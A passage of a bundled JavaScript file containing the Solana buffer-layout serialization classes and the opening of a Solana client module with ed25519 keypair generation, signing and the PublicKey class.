        Object.defineProperty(Class.prototype, 'encode', {
          value(b, offset) {
            return layout.encode(this, b, offset);
          },
          writable: true
        });
        Object.defineProperty(Class, 'decode', {
          value(b, offset) {
            return layout.decode(b, offset);
          },
          writable: true
        });
      }
      exports.bindConstructorLayout = bindConstructorLayout;
      class ExternalLayout extends Layout {
        isCount() {
          throw new Error('ExternalLayout is abstract');
        }
      }
      exports.ExternalLayout = ExternalLayout;
      class GreedyCount extends ExternalLayout {
        constructor(elementSpan = 1, property) {
          if (!Number.isInteger(elementSpan) || 0 >= elementSpan) {
            throw new TypeError('elementSpan must be a (positive) integer');
          }
          super(-1, property);
          this.elementSpan = elementSpan;
        }
        isCount() {
          return true;
        }
        decode(b, offset = 0) {
          checkUint8Array(b);
          const rem = b.length - offset;
          return Math.floor(rem / this.elementSpan);
        }
        encode(src, b, offset) {
          return 0;
        }
      }
      exports.GreedyCount = GreedyCount;
      class OffsetLayout extends ExternalLayout {
        constructor(layout, offset = 0, property) {
          if (!(layout instanceof Layout)) {
            throw new TypeError('layout must be a Layout');
          }
          if (!Number.isInteger(offset)) {
            throw new TypeError('offset must be integer or undefined');
          }
          super(layout.span, property || layout.property);
          this.layout = layout;
          this.offset = offset;
        }
        isCount() {
          return this.layout instanceof UInt || this.layout instanceof UIntBE;
        }
        decode(b, offset = 0) {
          return this.layout.decode(b, offset + this.offset);
        }
        encode(src, b, offset = 0) {
          return this.layout.encode(src, b, offset + this.offset);
        }
      }
      exports.OffsetLayout = OffsetLayout;
      class UInt extends Layout {
        constructor(span, property) {
          super(span, property);
          if (6 < this.span) {
            throw new RangeError('span must not exceed 6 bytes');
          }
        }
        decode(b, offset = 0) {
          return uint8ArrayToBuffer(b).readUIntLE(offset, this.span);
        }
        encode(src, b, offset = 0) {
          uint8ArrayToBuffer(b).writeUIntLE(src, offset, this.span);
          return this.span;
        }
      }
      exports.UInt = UInt;
      class UIntBE extends Layout {
        constructor(span, property) {
          super(span, property);
          if (6 < this.span) {
            throw new RangeError('span must not exceed 6 bytes');
          }
        }
        decode(b, offset = 0) {
          return uint8ArrayToBuffer(b).readUIntBE(offset, this.span);
        }
        encode(src, b, offset = 0) {
          uint8ArrayToBuffer(b).writeUIntBE(src, offset, this.span);
          return this.span;
        }
      }
      exports.UIntBE = UIntBE;
      class Int extends Layout {
        constructor(span, property) {
          super(span, property);
          if (6 < this.span) {
            throw new RangeError('span must not exceed 6 bytes');
          }
        }
        decode(b, offset = 0) {
          return uint8ArrayToBuffer(b).readIntLE(offset, this.span);
        }
        encode(src, b, offset = 0) {
          uint8ArrayToBuffer(b).writeIntLE(src, offset, this.span);
          return this.span;
        }
      }
      exports.Int = Int;
      class IntBE extends Layout {
        constructor(span, property) {
          super(span, property);
          if (6 < this.span) {
            throw new RangeError('span must not exceed 6 bytes');
          }
        }
        decode(b, offset = 0) {
          return uint8ArrayToBuffer(b).readIntBE(offset, this.span);
        }
        encode(src, b, offset = 0) {
          uint8ArrayToBuffer(b).writeIntBE(src, offset, this.span);
          return this.span;
        }
      }
      exports.IntBE = IntBE;
      const V2E32 = Math.pow(2, 32);
      function divmodInt64(src) {
        const hi32 = Math.floor(src / V2E32);
        const lo32 = src - hi32 * V2E32;
        return {
          hi32,
          lo32
        };
      }
      function roundedInt64(hi32, lo32) {
        return hi32 * V2E32 + lo32;
      }
      class NearUInt64 extends Layout {
        constructor(property) {
          super(8, property);
        }
        decode(b, offset = 0) {
          const buffer = uint8ArrayToBuffer(b);
          const lo32 = buffer.readUInt32LE(offset);
          const hi32 = buffer.readUInt32LE(offset + 4);
          return roundedInt64(hi32, lo32);
        }
        encode(src, b, offset = 0) {
          const split = divmodInt64(src);
          const buffer = uint8ArrayToBuffer(b);
          buffer.writeUInt32LE(split.lo32, offset);
          buffer.writeUInt32LE(split.hi32, offset + 4);
          return 8;
        }
      }
      exports.NearUInt64 = NearUInt64;
      class NearUInt64BE extends Layout {
        constructor(property) {
          super(8, property);
        }
        decode(b, offset = 0) {
          const buffer = uint8ArrayToBuffer(b);
          const hi32 = buffer.readUInt32BE(offset);
          const lo32 = buffer.readUInt32BE(offset + 4);
          return roundedInt64(hi32, lo32);
        }
        encode(src, b, offset = 0) {
          const split = divmodInt64(src);
          const buffer = uint8ArrayToBuffer(b);
          buffer.writeUInt32BE(split.hi32, offset);
          buffer.writeUInt32BE(split.lo32, offset + 4);
          return 8;
        }
      }
      exports.NearUInt64BE = NearUInt64BE;
      class NearInt64 extends Layout {
        constructor(property) {
          super(8, property);
        }
        decode(b, offset = 0) {
          const buffer = uint8ArrayToBuffer(b);
          const lo32 = buffer.readUInt32LE(offset);
          const hi32 = buffer.readInt32LE(offset + 4);
          return roundedInt64(hi32, lo32);
        }
        encode(src, b, offset = 0) {
          const split = divmodInt64(src);
          const buffer = uint8ArrayToBuffer(b);
          buffer.writeUInt32LE(split.lo32, offset);
          buffer.writeInt32LE(split.hi32, offset + 4);
          return 8;
        }
      }
      exports.NearInt64 = NearInt64;
      class NearInt64BE extends Layout {
        constructor(property) {
          super(8, property);
        }
        decode(b, offset = 0) {
          const buffer = uint8ArrayToBuffer(b);
          const hi32 = buffer.readInt32BE(offset);
          const lo32 = buffer.readUInt32BE(offset + 4);
          return roundedInt64(hi32, lo32);
        }
        encode(src, b, offset = 0) {
          const split = divmodInt64(src);
          const buffer = uint8ArrayToBuffer(b);
          buffer.writeInt32BE(split.hi32, offset);
          buffer.writeUInt32BE(split.lo32, offset + 4);
          return 8;
        }
      }
      exports.NearInt64BE = NearInt64BE;
      class Float extends Layout {
        constructor(property) {
          super(4, property);
        }
        decode(b, offset = 0) {
          return uint8ArrayToBuffer(b).readFloatLE(offset);
        }
        encode(src, b, offset = 0) {
          uint8ArrayToBuffer(b).writeFloatLE(src, offset);
          return 4;
        }
      }
      exports.Float = Float;
      class FloatBE extends Layout {
        constructor(property) {
          super(4, property);
        }
        decode(b, offset = 0) {
          return uint8ArrayToBuffer(b).readFloatBE(offset);
        }
        encode(src, b, offset = 0) {
          uint8ArrayToBuffer(b).writeFloatBE(src, offset);
          return 4;
        }
      }
      exports.FloatBE = FloatBE;
      class Double extends Layout {
        constructor(property) {
          super(8, property);
        }
        decode(b, offset = 0) {
          return uint8ArrayToBuffer(b).readDoubleLE(offset);
        }
        encode(src, b, offset = 0) {
          uint8ArrayToBuffer(b).writeDoubleLE(src, offset);
          return 8;
        }
      }
      exports.Double = Double;
      class DoubleBE extends Layout {
        constructor(property) {
          super(8, property);
        }
        decode(b, offset = 0) {
          return uint8ArrayToBuffer(b).readDoubleBE(offset);
        }
        encode(src, b, offset = 0) {
          uint8ArrayToBuffer(b).writeDoubleBE(src, offset);
          return 8;
        }
      }
      exports.DoubleBE = DoubleBE;
      class Sequence extends Layout {
        constructor(elementLayout, count, property) {
          if (!(elementLayout instanceof Layout)) {
            throw new TypeError('elementLayout must be a Layout');
          }
          if (!(count instanceof ExternalLayout && count.isCount() || Number.isInteger(count) && 0 <= count)) {
            throw new TypeError('count must be non-negative integer ' + 'or an unsigned integer ExternalLayout');
          }
          let span = -1;
          if (!(count instanceof ExternalLayout) && 0 < elementLayout.span) {
            span = count * elementLayout.span;
          }
          super(span, property);
          this.elementLayout = elementLayout;
          this.count = count;
        }
        getSpan(b, offset = 0) {
          if (0 <= this.span) {
            return this.span;
          }
          let span = 0;
          let count = this.count;
          if (count instanceof ExternalLayout) {
            count = count.decode(b, offset);
          }
          if (0 < this.elementLayout.span) {
            span = count * this.elementLayout.span;
          } else {
            let idx = 0;
            while (idx < count) {
              span += this.elementLayout.getSpan(b, offset + span);
              ++idx;
            }
          }
          return span;
        }
        decode(b, offset = 0) {
          const rv = [];
          let i = 0;
          let count = this.count;
          if (count instanceof ExternalLayout) {
            count = count.decode(b, offset);
          }
          while (i < count) {
            rv.push(this.elementLayout.decode(b, offset));
            offset += this.elementLayout.getSpan(b, offset);
            i += 1;
          }
          return rv;
        }
        encode(src, b, offset = 0) {
          const elo = this.elementLayout;
          const span = src.reduce((span, v) => {
            return span + elo.encode(v, b, offset + span);
          }, 0);
          if (this.count instanceof ExternalLayout) {
            this.count.encode(src.length, b, offset);
          }
          return span;
        }
      }
      exports.Sequence = Sequence;
      class Structure extends Layout {
        constructor(fields, property, decodePrefixes) {
          if (!(Array.isArray(fields) && fields.reduce((acc, v) => acc && v instanceof Layout, true))) {
            throw new TypeError('fields must be array of Layout instances');
          }
          if ('boolean' === typeof property && undefined === decodePrefixes) {
            decodePrefixes = property;
            property = undefined;
          }
          for (const fd of fields) {
            if (0 > fd.span && undefined === fd.property) {
              throw new Error('fields cannot contain unnamed variable-length layout');
            }
          }
          let span = -1;
          try {
            span = fields.reduce((span, fd) => span + fd.getSpan(), 0);
          } catch (e) {}
          super(span, property);
          this.fields = fields;
          this.decodePrefixes = !!decodePrefixes;
        }
        getSpan(b, offset = 0) {
          if (0 <= this.span) {
            return this.span;
          }
          let span = 0;
          try {
            span = this.fields.reduce((span, fd) => {
              const fsp = fd.getSpan(b, offset);
              offset += fsp;
              return span + fsp;
            }, 0);
          } catch (e) {
            throw new RangeError('indeterminate span');
          }
          return span;
        }
        decode(b, offset = 0) {
          checkUint8Array(b);
          const dest = this.makeDestinationObject();
          for (const fd of this.fields) {
            if (undefined !== fd.property) {
              dest[fd.property] = fd.decode(b, offset);
            }
            offset += fd.getSpan(b, offset);
            if (this.decodePrefixes && b.length === offset) {
              break;
            }
          }
          return dest;
        }
        encode(src, b, offset = 0) {
          const firstOffset = offset;
          let lastOffset = 0;
          let lastWrote = 0;
          for (const fd of this.fields) {
            let span = fd.span;
            lastWrote = 0 < span ? span : 0;
            if (undefined !== fd.property) {
              const fv = src[fd.property];
              if (undefined !== fv) {
                lastWrote = fd.encode(fv, b, offset);
                if (0 > span) {
                  span = fd.getSpan(b, offset);
                }
              }
            }
            lastOffset = offset;
            offset += span;
          }
          return lastOffset + lastWrote - firstOffset;
        }
        fromArray(values) {
          const dest = this.makeDestinationObject();
          for (const fd of this.fields) {
            if (undefined !== fd.property && 0 < values.length) {
              dest[fd.property] = values.shift();
            }
          }
          return dest;
        }
        layoutFor(property) {
          if ('string' !== typeof property) {
            throw new TypeError('property must be string');
          }
          for (const fd of this.fields) {
            if (fd.property === property) {
              return fd;
            }
          }
          return undefined;
        }
        offsetOf(property) {
          if ('string' !== typeof property) {
            throw new TypeError('property must be string');
          }
          let offset = 0;
          for (const fd of this.fields) {
            if (fd.property === property) {
              return offset;
            }
            if (0 > fd.span) {
              offset = -1;
            } else if (0 <= offset) {
              offset += fd.span;
            }
          }
          return undefined;
        }
      }
      exports.Structure = Structure;
      class UnionDiscriminator {
        constructor(property) {
          this.property = property;
        }
        decode(b, offset) {
          throw new Error('UnionDiscriminator is abstract');
        }
        encode(src, b, offset) {
          throw new Error('UnionDiscriminator is abstract');
        }
      }
      exports.UnionDiscriminator = UnionDiscriminator;
      class UnionLayoutDiscriminator extends UnionDiscriminator {
        constructor(layout, property) {
          if (!(layout instanceof ExternalLayout && layout.isCount())) {
            throw new TypeError('layout must be an unsigned integer ExternalLayout');
          }
          super(property || layout.property || 'variant');
          this.layout = layout;
        }
        decode(b, offset) {
          return this.layout.decode(b, offset);
        }
        encode(src, b, offset) {
          return this.layout.encode(src, b, offset);
        }
      }
      exports.UnionLayoutDiscriminator = UnionLayoutDiscriminator;
      class Union extends Layout {
        constructor(discr, defaultLayout, property) {
          let discriminator;
          if (discr instanceof UInt || discr instanceof UIntBE) {
            discriminator = new UnionLayoutDiscriminator(new OffsetLayout(discr));
          } else if (discr instanceof ExternalLayout && discr.isCount()) {
            discriminator = new UnionLayoutDiscriminator(discr);
          } else if (!(discr instanceof UnionDiscriminator)) {
            throw new TypeError('discr must be a UnionDiscriminator ' + 'or an unsigned integer layout');
          } else {
            discriminator = discr;
          }
          if (undefined === defaultLayout) {
            defaultLayout = null;
          }
          if (!(null === defaultLayout || defaultLayout instanceof Layout)) {
            throw new TypeError('defaultLayout must be null or a Layout');
          }
          if (null !== defaultLayout) {
            if (0 > defaultLayout.span) {
              throw new Error('defaultLayout must have constant span');
            }
            if (undefined === defaultLayout.property) {
              defaultLayout = defaultLayout.replicate('content');
            }
          }
          let span = -1;
          if (defaultLayout) {
            span = defaultLayout.span;
            if (0 <= span && (discr instanceof UInt || discr instanceof UIntBE)) {
              span += discriminator.layout.span;
            }
          }
          super(span, property);
          this.discriminator = discriminator;
          this.usesPrefixDiscriminator = discr instanceof UInt || discr instanceof UIntBE;
          this.defaultLayout = defaultLayout;
          this.registry = {};
          let boundGetSourceVariant = this.defaultGetSourceVariant.bind(this);
          this.getSourceVariant = function (src) {
            return boundGetSourceVariant(src);
          };
          this.configGetSourceVariant = function (gsv) {
            boundGetSourceVariant = gsv.bind(this);
          };
        }
        getSpan(b, offset = 0) {
          if (0 <= this.span) {
            return this.span;
          }
          const vlo = this.getVariant(b, offset);
          if (!vlo) {
            throw new Error('unable to determine span for unrecognized variant');
          }
          return vlo.getSpan(b, offset);
        }
        defaultGetSourceVariant(src) {
          if (Object.prototype.hasOwnProperty.call(src, this.discriminator.property)) {
            if (this.defaultLayout && this.defaultLayout.property && Object.prototype.hasOwnProperty.call(src, this.defaultLayout.property)) {
              return undefined;
            }
            const vlo = this.registry[src[this.discriminator.property]];
            if (vlo && (!vlo.layout || vlo.property && Object.prototype.hasOwnProperty.call(src, vlo.property))) {
              return vlo;
            }
          } else {
            for (const tag in this.registry) {
              const vlo = this.registry[tag];
              if (vlo.property && Object.prototype.hasOwnProperty.call(src, vlo.property)) {
                return vlo;
              }
            }
          }
          throw new Error('unable to infer src variant');
        }
        decode(b, offset = 0) {
          let dest;
          const dlo = this.discriminator;
          const discr = dlo.decode(b, offset);
          const clo = this.registry[discr];
          if (undefined === clo) {
            const defaultLayout = this.defaultLayout;
            let contentOffset = 0;
            if (this.usesPrefixDiscriminator) {
              contentOffset = dlo.layout.span;
            }
            dest = this.makeDestinationObject();
            dest[dlo.property] = discr;
            dest[defaultLayout.property] = defaultLayout.decode(b, offset + contentOffset);
          } else {
            dest = clo.decode(b, offset);
          }
          return dest;
        }
        encode(src, b, offset = 0) {
          const vlo = this.getSourceVariant(src);
          if (undefined === vlo) {
            const dlo = this.discriminator;
            const clo = this.defaultLayout;
            let contentOffset = 0;
            if (this.usesPrefixDiscriminator) {
              contentOffset = dlo.layout.span;
            }
            dlo.encode(src[dlo.property], b, offset);
            return contentOffset + clo.encode(src[clo.property], b, offset + contentOffset);
          }
          return vlo.encode(src, b, offset);
        }
        addVariant(variant, layout, property) {
          const rv = new VariantLayout(this, variant, layout, property);
          this.registry[variant] = rv;
          return rv;
        }
        getVariant(vb, offset = 0) {
          let variant;
          if (vb instanceof Uint8Array) {
            variant = this.discriminator.decode(vb, offset);
          } else {
            variant = vb;
          }
          return this.registry[variant];
        }
      }
      exports.Union = Union;
      class VariantLayout extends Layout {
        constructor(union, variant, layout, property) {
          if (!(union instanceof Union)) {
            throw new TypeError('union must be a Union');
          }
          if (!Number.isInteger(variant) || 0 > variant) {
            throw new TypeError('variant must be a (non-negative) integer');
          }
          if ('string' === typeof layout && undefined === property) {
            property = layout;
            layout = null;
          }
          if (layout) {
            if (!(layout instanceof Layout)) {
              throw new TypeError('layout must be a Layout');
            }
            if (null !== union.defaultLayout && 0 <= layout.span && layout.span > union.defaultLayout.span) {
              throw new Error('variant span exceeds span of containing union');
            }
            if ('string' !== typeof property) {
              throw new TypeError('variant must have a String property');
            }
          }
          let span = union.span;
          if (0 > union.span) {
            span = layout ? layout.span : 0;
            if (0 <= span && union.usesPrefixDiscriminator) {
              span += union.discriminator.layout.span;
            }
          }
          super(span, property);
          this.union = union;
          this.variant = variant;
          this.layout = layout || null;
        }
        getSpan(b, offset = 0) {
          if (0 <= this.span) {
            return this.span;
          }
          let contentOffset = 0;
          if (this.union.usesPrefixDiscriminator) {
            contentOffset = this.union.discriminator.layout.span;
          }
          let span = 0;
          if (this.layout) {
            span = this.layout.getSpan(b, offset + contentOffset);
          }
          return contentOffset + span;
        }
        decode(b, offset = 0) {
          const dest = this.makeDestinationObject();
          if (this !== this.union.getVariant(b, offset)) {
            throw new Error('variant mismatch');
          }
          let contentOffset = 0;
          if (this.union.usesPrefixDiscriminator) {
            contentOffset = this.union.discriminator.layout.span;
          }
          if (this.layout) {
            dest[this.property] = this.layout.decode(b, offset + contentOffset);
          } else if (this.property) {
            dest[this.property] = true;
          } else if (this.union.usesPrefixDiscriminator) {
            dest[this.union.discriminator.property] = this.variant;
          }
          return dest;
        }
        encode(src, b, offset = 0) {
          let contentOffset = 0;
          if (this.union.usesPrefixDiscriminator) {
            contentOffset = this.union.discriminator.layout.span;
          }
          if (this.layout && !Object.prototype.hasOwnProperty.call(src, this.property)) {
            throw new TypeError('variant lacks property ' + this.property);
          }
          this.union.discriminator.encode(this.variant, b, offset);
          let span = contentOffset;
          if (this.layout) {
            this.layout.encode(src[this.property], b, offset + contentOffset);
            span += this.layout.getSpan(b, offset + contentOffset);
            if (0 <= this.union.span && span > this.union.span) {
              throw new Error('encoded variant overruns containing union');
            }
          }
          return span;
        }
        fromArray(values) {
          if (this.layout) {
            return this.layout.fromArray(values);
          }
          return undefined;
        }
      }
      exports.VariantLayout = VariantLayout;
      function fixBitwiseResult(v) {
        if (0 > v) {
          v += 0x100000000;
        }
        return v;
      }
      class BitStructure extends Layout {
        constructor(word, msb, property) {
          if (!(word instanceof UInt || word instanceof UIntBE)) {
            throw new TypeError('word must be a UInt or UIntBE layout');
          }
          if ('string' === typeof msb && undefined === property) {
            property = msb;
            msb = false;
          }
          if (4 < word.span) {
            throw new RangeError('word cannot exceed 32 bits');
          }
          super(word.span, property);
          this.word = word;
          this.msb = !!msb;
          this.fields = [];
          let value = 0;
          this._packedSetValue = function (v) {
            value = fixBitwiseResult(v);
            return this;
          };
          this._packedGetValue = function () {
            return value;
          };
        }
        decode(b, offset = 0) {
          const dest = this.makeDestinationObject();
          const value = this.word.decode(b, offset);
          this._packedSetValue(value);
          for (const fd of this.fields) {
            if (undefined !== fd.property) {
              dest[fd.property] = fd.decode(b);
            }
          }
          return dest;
        }
        encode(src, b, offset = 0) {
          const value = this.word.decode(b, offset);
          this._packedSetValue(value);
          for (const fd of this.fields) {
            if (undefined !== fd.property) {
              const fv = src[fd.property];
              if (undefined !== fv) {
                fd.encode(fv);
              }
            }
          }
          return this.word.encode(this._packedGetValue(), b, offset);
        }
        addField(bits, property) {
          const bf = new BitField(this, bits, property);
          this.fields.push(bf);
          return bf;
        }
        addBoolean(property) {
          const bf = new Boolean(this, property);
          this.fields.push(bf);
          return bf;
        }
        fieldFor(property) {
          if ('string' !== typeof property) {
            throw new TypeError('property must be string');
          }
          for (const fd of this.fields) {
            if (fd.property === property) {
              return fd;
            }
          }
          return undefined;
        }
      }
      exports.BitStructure = BitStructure;
      class BitField {
        constructor(container, bits, property) {
          if (!(container instanceof BitStructure)) {
            throw new TypeError('container must be a BitStructure');
          }
          if (!Number.isInteger(bits) || 0 >= bits) {
            throw new TypeError('bits must be positive integer');
          }
          const totalBits = 8 * container.span;
          const usedBits = container.fields.reduce((sum, fd) => sum + fd.bits, 0);
          if (bits + usedBits > totalBits) {
            throw new Error('bits too long for span remainder (' + (totalBits - usedBits) + ' of ' + totalBits + ' remain)');
          }
          this.container = container;
          this.bits = bits;
          this.valueMask = (1 << bits) - 1;
          if (32 === bits) {
            this.valueMask = 0xFFFFFFFF;
          }
          this.start = usedBits;
          if (this.container.msb) {
            this.start = totalBits - usedBits - bits;
          }
          this.wordMask = fixBitwiseResult(this.valueMask << this.start);
          this.property = property;
        }
        decode(b, offset) {
          const word = this.container._packedGetValue();
          const wordValue = fixBitwiseResult(word & this.wordMask);
          const value = wordValue >>> this.start;
          return value;
        }
        encode(value) {
          if ('number' !== typeof value || !Number.isInteger(value) || value !== fixBitwiseResult(value & this.valueMask)) {
            throw new TypeError(nameWithProperty('BitField.encode', this) + ' value must be integer not exceeding ' + this.valueMask);
          }
          const word = this.container._packedGetValue();
          const wordValue = fixBitwiseResult(value << this.start);
          this.container._packedSetValue(fixBitwiseResult(word & ~this.wordMask) | wordValue);
        }
      }
      exports.BitField = BitField;
      class Boolean extends BitField {
        constructor(container, property) {
          super(container, 1, property);
        }
        decode(b, offset) {
          return !!super.decode(b, offset);
        }
        encode(value) {
          if ('boolean' === typeof value) {
            value = +value;
          }
          super.encode(value);
        }
      }
      exports.Boolean = Boolean;
      class Blob extends Layout {
        constructor(length, property) {
          if (!(length instanceof ExternalLayout && length.isCount() || Number.isInteger(length) && 0 <= length)) {
            throw new TypeError('length must be positive integer ' + 'or an unsigned integer ExternalLayout');
          }
          let span = -1;
          if (!(length instanceof ExternalLayout)) {
            span = length;
          }
          super(span, property);
          this.length = length;
        }
        getSpan(b, offset) {
          let span = this.span;
          if (0 > span) {
            span = this.length.decode(b, offset);
          }
          return span;
        }
        decode(b, offset = 0) {
          let span = this.span;
          if (0 > span) {
            span = this.length.decode(b, offset);
          }
          return uint8ArrayToBuffer(b).slice(offset, offset + span);
        }
        encode(src, b, offset) {
          let span = this.length;
          if (this.length instanceof ExternalLayout) {
            span = src.length;
          }
          if (!(src instanceof Uint8Array && span === src.length)) {
            throw new TypeError(nameWithProperty('Blob.encode', this) + ' requires (length ' + span + ') Uint8Array as src');
          }
          if (offset + span > b.length) {
            throw new RangeError('encoding overruns Uint8Array');
          }
          const srcBuffer = uint8ArrayToBuffer(src);
          uint8ArrayToBuffer(b).write(srcBuffer.toString('hex'), offset, span, 'hex');
          if (this.length instanceof ExternalLayout) {
            this.length.encode(span, b, offset);
          }
          return span;
        }
      }
      exports.Blob = Blob;
      class CString extends Layout {
        constructor(property) {
          super(-1, property);
        }
        getSpan(b, offset = 0) {
          checkUint8Array(b);
          let idx = offset;
          while (idx < b.length && 0 !== b[idx]) {
            idx += 1;
          }
          return 1 + idx - offset;
        }
        decode(b, offset = 0) {
          const span = this.getSpan(b, offset);
          return uint8ArrayToBuffer(b).slice(offset, offset + span - 1).toString('utf-8');
        }
        encode(src, b, offset = 0) {
          if ('string' !== typeof src) {
            src = String(src);
          }
          const srcb = buffer_1.Buffer.from(src, 'utf8');
          const span = srcb.length;
          if (offset + span > b.length) {
            throw new RangeError('encoding overruns Buffer');
          }
          const buffer = uint8ArrayToBuffer(b);
          srcb.copy(buffer, offset);
          buffer[offset + span] = 0;
          return span + 1;
        }
      }
      exports.CString = CString;
      class UTF8 extends Layout {
        constructor(maxSpan, property) {
          if ('string' === typeof maxSpan && undefined === property) {
            property = maxSpan;
            maxSpan = undefined;
          }
          if (undefined === maxSpan) {
            maxSpan = -1;
          } else if (!Number.isInteger(maxSpan)) {
            throw new TypeError('maxSpan must be an integer');
          }
          super(-1, property);
          this.maxSpan = maxSpan;
        }
        getSpan(b, offset = 0) {
          checkUint8Array(b);
          return b.length - offset;
        }
        decode(b, offset = 0) {
          const span = this.getSpan(b, offset);
          if (0 <= this.maxSpan && this.maxSpan < span) {
            throw new RangeError('text length exceeds maxSpan');
          }
          return uint8ArrayToBuffer(b).slice(offset, offset + span).toString('utf-8');
        }
        encode(src, b, offset = 0) {
          if ('string' !== typeof src) {
            src = String(src);
          }
          const srcb = buffer_1.Buffer.from(src, 'utf8');
          const span = srcb.length;
          if (0 <= this.maxSpan && this.maxSpan < span) {
            throw new RangeError('text length exceeds maxSpan');
          }
          if (offset + span > b.length) {
            throw new RangeError('encoding overruns Buffer');
          }
          srcb.copy(uint8ArrayToBuffer(b), offset);
          return span;
        }
      }
      exports.UTF8 = UTF8;
      class Constant extends Layout {
        constructor(value, property) {
          super(0, property);
          this.value = value;
        }
        decode(b, offset) {
          return this.value;
        }
        encode(src, b, offset) {
          return 0;
        }
      }
      exports.Constant = Constant;
      exports.greedy = (elementSpan, property) => new GreedyCount(elementSpan, property);
      exports.offset = (layout, offset, property) => new OffsetLayout(layout, offset, property);
      exports.u8 = property => new UInt(1, property);
      exports.u16 = property => new UInt(2, property);
      exports.u24 = property => new UInt(3, property);
      exports.u32 = property => new UInt(4, property);
      exports.u40 = property => new UInt(5, property);
      exports.u48 = property => new UInt(6, property);
      exports.nu64 = property => new NearUInt64(property);
      exports.u16be = property => new UIntBE(2, property);
      exports.u24be = property => new UIntBE(3, property);
      exports.u32be = property => new UIntBE(4, property);
      exports.u40be = property => new UIntBE(5, property);
      exports.u48be = property => new UIntBE(6, property);
      exports.nu64be = property => new NearUInt64BE(property);
      exports.s8 = property => new Int(1, property);
      exports.s16 = property => new Int(2, property);
      exports.s24 = property => new Int(3, property);
      exports.s32 = property => new Int(4, property);
      exports.s40 = property => new Int(5, property);
      exports.s48 = property => new Int(6, property);
      exports.ns64 = property => new NearInt64(property);
      exports.s16be = property => new IntBE(2, property);
      exports.s24be = property => new IntBE(3, property);
      exports.s32be = property => new IntBE(4, property);
      exports.s40be = property => new IntBE(5, property);
      exports.s48be = property => new IntBE(6, property);
      exports.ns64be = property => new NearInt64BE(property);
      exports.f32 = property => new Float(property);
      exports.f32be = property => new FloatBE(property);
      exports.f64 = property => new Double(property);
      exports.f64be = property => new DoubleBE(property);
      exports.struct = (fields, property, decodePrefixes) => new Structure(fields, property, decodePrefixes);
      exports.bits = (word, msb, property) => new BitStructure(word, msb, property);
      exports.seq = (elementLayout, count, property) => new Sequence(elementLayout, count, property);
      exports.union = (discr, defaultLayout, property) => new Union(discr, defaultLayout, property);
      exports.unionLayoutDiscriminator = (layout, property) => new UnionLayoutDiscriminator(layout, property);
      exports.blob = (length, property) => new Blob(length, property);
      exports.cstr = property => new CString(property);
      exports.utf8 = (maxSpan, property) => new UTF8(maxSpan, property);
      exports.constant = (value, property) => new Constant(value, property);
    }, {
      "buffer": 3
    }],
    48: [function (require, module, exports) {
      'use strict';

      Object.defineProperty(exports, '__esModule', {
        value: true
      });
      var buffer = require('buffer');
      var sha512 = require('@noble/hashes/sha512');
      var ed25519 = require('@noble/ed25519');
      var BN = require('bn.js');
      var bs58 = require('bs58');
      var sha256 = require('@noble/hashes/sha256');
      var borsh = require('borsh');
      var BufferLayout = require('@solana/buffer-layout');
      var bigintBuffer = require('bigint-buffer');
      var superstruct = require('superstruct');
      var rpcWebsockets = require('rpc-websockets');
      var RpcClient = require('jayson/lib/client/browser');
      var sha3 = require('@noble/hashes/sha3');
      var hmac = require('@noble/hashes/hmac');
      var secp256k1 = require('@noble/secp256k1');
      function _interopDefaultLegacy(e) {
        return e && typeof e === 'object' && 'default' in e ? e : {
          'default': e
        };
      }
      function _interopNamespace(e) {
        if (e && e.__esModule) return e;
        var n = Object.create(null);
        if (e) {
          Object.keys(e).forEach(function (k) {
            if (k !== 'default') {
              var d = Object.getOwnPropertyDescriptor(e, k);
              Object.defineProperty(n, k, d.get ? d : {
                enumerable: true,
                get: function () {
                  return e[k];
                }
              });
            }
          });
        }
        n["default"] = e;
        return Object.freeze(n);
      }
      var ed25519__namespace = _interopNamespace(ed25519);
      var BN__default = _interopDefaultLegacy(BN);
      var bs58__default = _interopDefaultLegacy(bs58);
      var BufferLayout__namespace = _interopNamespace(BufferLayout);
      var RpcClient__default = _interopDefaultLegacy(RpcClient);
      var secp256k1__namespace = _interopNamespace(secp256k1);
      ed25519__namespace.utils.sha512Sync = (...m) => sha512.sha512(ed25519__namespace.utils.concatBytes(...m));
      const generatePrivateKey = ed25519__namespace.utils.randomPrivateKey;
      const generateKeypair = () => {
        const privateScalar = ed25519__namespace.utils.randomPrivateKey();
        const publicKey = getPublicKey(privateScalar);
        const secretKey = new Uint8Array(64);
        secretKey.set(privateScalar);
        secretKey.set(publicKey, 32);
        return {
          publicKey,
          secretKey
        };
      };
      const getPublicKey = ed25519__namespace.sync.getPublicKey;
      function isOnCurve(publicKey) {
        try {
          ed25519__namespace.Point.fromHex(publicKey, true);
          return true;
        } catch {
          return false;
        }
      }
      const sign = (message, secretKey) => ed25519__namespace.sync.sign(message, secretKey.slice(0, 32));
      const verify = ed25519__namespace.sync.verify;
      const toBuffer = arr => {
        if (buffer.Buffer.isBuffer(arr)) {
          return arr;
        } else if (arr instanceof Uint8Array) {
          return buffer.Buffer.from(arr.buffer, arr.byteOffset, arr.byteLength);
        } else {
          return buffer.Buffer.from(arr);
        }
      };
      class Struct {
        constructor(properties) {
          Object.assign(this, properties);
        }
        encode() {
          return buffer.Buffer.from(borsh.serialize(SOLANA_SCHEMA, this));
        }
        static decode(data) {
          return borsh.deserialize(SOLANA_SCHEMA, this, data);
        }
        static decodeUnchecked(data) {
          return borsh.deserializeUnchecked(SOLANA_SCHEMA, this, data);
        }
      }
      class Enum extends Struct {
        constructor(properties) {
          super(properties);
          this.enum = '';
          if (Object.keys(properties).length !== 1) {
            throw new Error('Enum can only take single value');
          }
          Object.keys(properties).map(key => {
            this.enum = key;
          });
        }
      }
      const SOLANA_SCHEMA = new Map();
      const MAX_SEED_LENGTH = 32;
      const PUBLIC_KEY_LENGTH = 32;
      function isPublicKeyData(value) {
        return value._bn !== undefined;
      }
      let uniquePublicKeyCounter = 1;
      class PublicKey extends Struct {
        constructor(value) {
          super({});
          this._bn = void 0;
          if (isPublicKeyData(value)) {
            this._bn = value._bn;
          } else {
            if (typeof value === 'string') {
              const decoded = bs58__default["default"].decode(value);
              if (decoded.length != PUBLIC_KEY_LENGTH) {
                throw new Error(`Invalid public key input`);
              }
              this._bn = new BN__default["default"](decoded);
            } else {
              this._bn = new BN__default["default"](value);
            }
            if (this._bn.byteLength() > 32) {
              throw new Error(`Invalid public key input`);
            }
          }
        }
        static unique() {
          const key = new PublicKey(uniquePublicKeyCounter);
          uniquePublicKeyCounter += 1;
          return new PublicKey(key.toBuffer());
        }
        equals(publicKey) {
          return this._bn.eq(publicKey._bn);
        }
